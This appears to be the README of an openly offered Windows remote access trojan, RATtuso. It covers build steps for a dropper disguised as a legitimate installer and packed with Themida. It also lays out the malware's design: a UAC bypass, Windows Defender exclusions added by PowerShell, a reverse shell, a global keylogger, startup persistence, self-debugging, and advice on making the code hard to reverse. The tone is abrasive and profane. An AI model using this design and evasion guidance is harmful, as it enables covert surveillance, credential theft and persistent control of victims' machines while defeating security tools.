![rattusissimo](https://user-images.githubusercontent.com/88135556/175606304-e6ca0b95-4d65-4e0f-a1bd-916467b84e61.png) 
# RATtuso
### Why this name?
Look up the italian definition of "rattuso"
### Why open source?
To flex and cuz I want a custom Windows Defender identificator that says "Virus type: RATTUSO!general" or sum shit like that
### Can you help me compile this?
No, now shut the fuck up.

## Setup
Download [CMake](https://cmake.org/download/ "CMake download") and [vcpkg](https://vcpkg.io/en/getting-started.html).
Open the project and inside the powershell cd to the directory where vcpkg is installed and paste these commands:
```
cd [DirectoryWhereVCPKGIsLocated]
.\vcpkg install libzippp:x64-windows-static
.\vcpkg integrate install
```
If this still is not enough try also running these
```
.\vcpkg install zlib:x64-windows-static
.\vcpkg install liblzma:x64-windows-static
.\vcpkg integrate install
```

## How to build server (Native Windows/Linux):
Use these commands from Server source files folder
```
cmake -S . -B build 
cmake --build build --target ServerCrossPlatform --config Release
```

## How to build RAT
Open build.bat in file editor and change global variables according to your system.
In particular you should set these variables:
```
:: 1 means skip DLL building since source has NO_DLL macro defined
set /A NoDll = 1
:: 1 means protect main shell using themida
set /A UseThemida = 1
:: Full path to the legit program that will be executed (make sure to check if such program is x86 or x64 if building with DLL)
set LegitProgramPath="C:\Users\bombo\Downloads\Adobe Master Collection CC 2022 v17.02.2022 (x64) Multilingua\AutoPlay\Docs\Adobe After Effects 2022 SP\Set-up.exe"
:: Folder where themida is stored on your PC
set ThemidaPath="C:\Users\bombo\Downloads\Themida_x32_x64_v3.0.4.0_Repacked"
:: Full path to MSBuild.exe
set MSBuildPath="C:\Program Files\Microsoft Visual Studio\2022\Community\Msbuild\Current\Bin\MSBuild.exe"
:: Set this to the same platform as the legit program
set Platform=x86
```

## How to remove RAT
Run remove.bat as Administrator

## How it works (updated)
At the moment the RAT is made of 2 modules + 1 that is the optional dll.

### Module list:
1. Main loader that extracts and executes the legitimate executable
2. Main DLL which gets manually mapped by the loader inside the legitimate executable
3. Reverse shell / self-debugger / self-persistence / advanced keylogger / startup execution / self-elevation

## Main loader (Native)
At startup loader will attempt to auto elevate using a UAC bypass exploit using CMLUAUTIL COM interface.
It will then extract from its own memory both our dll and legitimate executable.
It will start the legit exe and manual map the dll inside of it (overkill against av runtime checks, but useful against reverse engineering attempts. Also useful for self cleanup without needing to interact with cmd)
It will then start the cleanup procedure where the loader will be deleted to leave space for the legit executable

## Dll (Native)
Manual map kernel32.dll inside of the legit process and manually resolve CreateProcessA (to avoid API hooking).
Using powershell create exclusions for Windows defender so that in case signatures are made in the future for any of the next modules, they will persist stealthily.
Extract from its own memory the shell and start it.
End the cleanup procedure started by the main loader.

## Reverse shell (Native)
Now shit gets kinda complicated so bare with me here.
The shell has 3 branches inside the main function, and each one belongs to one specific process.
When first started it will attempt to open the backup shell, which only purpose in life is to keep the main shell running.
### Important considerations:
1. Backup shell code needs to run on a secondary process to make shit difficult to reverse.
2. Backup shell main function should not just Sleep(INDEFINITELY) but you should put useless (but not useless looking) code that loops infinitely.
3. None of the branches will be reached if the shell isn't started in one of 2 predefined folders with a specific name.
4. Backup shell will always try to be the parent process of the main shell, so that it can be its debugger (check out self debugging malware)
5. Main shell will create a global keyboard hook and a window change event listener for the keylogger
6. Third branch acts as the old service (which got replaced due to the "new" nature of services and their tendency to be as isolated as possible from the user), which explains why in the code you'll sometimes see SERVICE mentioned in some macros and functions.  
This 3rd branch will just install itself to the startup folder and periodically check if main shell has been closed/deleted, and if main shell bytes match its ones (this is done to detect updates which are done by the main shell downloading itself from the server and copying it to startup folder, overriding the old "service", which then when started detects this change and updates main and backup shell)

# Credits:
Shell and server have been cloned and modified from Lilith RAT to use as boilerplate.
UAC bypass has been kindly cloned from n.41 bypass of UACme.
I'd also like to thank myself for putting effort into this knowing these months of work will pay off as gained knowledge and 0$.
